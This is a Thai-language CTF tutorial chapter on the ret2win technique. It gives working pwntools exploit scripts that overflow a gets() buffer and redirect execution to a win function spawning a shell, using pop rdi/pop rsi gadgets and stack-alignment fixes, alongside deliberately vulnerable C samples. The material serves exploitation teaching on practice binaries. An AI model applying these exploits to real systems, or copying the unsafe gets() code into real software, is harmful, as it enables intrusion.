# บท 6 — ret2win

เทคนิคแรกที่ต้องทำได้คล่อง ง่ายที่สุดและเจอบ่อยที่สุดในโจทย์ intro

## แนวคิด

**ret2win** = โปรแกรมมีฟังก์ชัน "win" ที่ทำสิ่งดีๆ ให้เราอยู่แล้ว (เช่น
เปิด shell หรือ print flag) แต่ปกติไม่มีทางเรียกถึง เราแค่ overflow แล้ว
ชี้ return address ไปที่ฟังก์ชันนั้น

```
ปกติ:  main → vuln → (return กลับ main)
เรา:   main → vuln → (return ไป win!)  ← เปลี่ยนปลายทาง
```

## เคสที่ 1: win ไม่มี argument (ง่ายสุด)

```c
void win() {
    system("/bin/sh");
}
void vuln() {
    char buf[64];
    gets(buf);
}
```

Exploit:

```python
from pwn import *
context.binary = elf = ELF('./vuln')
p = process('./vuln')

payload = b'A' * 72              # offset (หาด้วย cyclic)
payload += p64(elf.symbols['win'])

p.sendline(payload)
p.interactive()
```

จบ! นี่คือ ret2win แบบพื้นฐานสุด

## เคสที่ 2: win ต้องการ argument

บางโจทย์ฟังก์ชัน win เช็ค argument ก่อน:

```c
void win(int code) {
    if (code == 0xdeadbeef) {
        system("/bin/sh");
    }
}
```

ต้องส่ง argument ผ่าน **RDI** (argument ตัวแรก, จำจากบท 2) เราทำโดยใช้
gadget `pop rdi; ret`:

```python
from pwn import *
context.binary = elf = ELF('./vuln')
p = process('./vuln')

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

payload = flat(
    b'A' * 72,
    p64(pop_rdi),               # pop rdi; ret
    p64(0xdeadbeef),            # ค่านี้จะถูก pop เข้า RDI
    p64(elf.symbols['win']),    # แล้วกระโดดไป win
)
p.sendline(payload)
p.interactive()
```

### ทำไมต้อง `pop rdi; ret`

- `pop rdi` = ดึงค่าถัดไปบน stack (0xdeadbeef) ใส่ RDI
- `ret` = กระโดดไป address ถัดไปบน stack (win)

stack ตอนทำงาน:

```
[pop_rdi addr]  ← RIP มาที่นี่ → รัน "pop rdi; ret"
[0xdeadbeef]    ← ถูก pop เข้า RDI
[win addr]      ← ret กระโดดมาที่นี่ พร้อม RDI=0xdeadbeef แล้ว
```

## เคสที่ 3: win ต้องการ argument 2 ตัว

```c
void win(int a, int b) {
    if (a == 0xcafe && b == 0xbabe) system("/bin/sh");
}
```

ต้องใช้ทั้ง RDI (arg1) และ RSI (arg2):

```python
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
# บางที pop rsi มากับ r15: 'pop rsi ; pop r15 ; ret'

payload = flat(
    b'A' * 72,
    p64(pop_rdi), p64(0xcafe),
    p64(pop_rsi), p64(0xbabe),
    p64(elf.symbols['win']),
)
```

## แก้ปัญหา stack alignment

ถ้าเรียก win แล้ว crash ที่ `movaps` (มักเกิดตอน system) ให้เพิ่ม `ret`
เปล่า 1 ตัวก่อน:

```python
ret = rop.find_gadget(['ret'])[0]

payload = flat(
    b'A' * 72,
    p64(ret),                   # ← align stack
    p64(elf.symbols['win']),
)
```

## checklist ทำ ret2win

1. ☐ [checksec](05-tools.md#1-checksec--ด่านแรกเสมอ) — ยืนยันว่า No canary (ถ้ามี canary ต้อง leak ก่อน)
2. ☐ หา win ด้วย Ghidra/objdump — จด address และดูว่าต้อง arg ไหม
3. ☐ หา offset ด้วย cyclic
4. ☐ ถ้าต้อง arg → หา `pop rdi; ret` ด้วย ROPgadget/pwntools
5. ☐ เขียน payload → ทดสอบ local → ยิง remote
6. ☐ ถ้า crash ที่ movaps → เพิ่ม `ret` align

## หา gadget ด้วย command line

```bash
ROPgadget --binary ./vuln | grep "pop rdi"
# 0x0000000000401234 : pop rdi ; ret

ROPgadget --binary ./vuln | grep ": ret"
# 0x000000000040101a : ret
```

---

## สรุปบทนี้

- ret2win = ชี้ return ไปฟังก์ชัน win ที่มีอยู่แล้ว
- ไม่มี arg → ส่ง address win ตรงๆ
- มี arg → ใช้ `pop rdi; ret` (และ `pop rsi` ถ้า 2 ตัว)
- crash ที่ movaps → เพิ่ม `ret` align

โจทย์ฝึก: picoCTF **ret2win**, ROP Emporium **ret2win**, **callme**, **split**

บทต่อไป: ret2libc — เมื่อไม่มีฟังก์ชัน win ให้ →
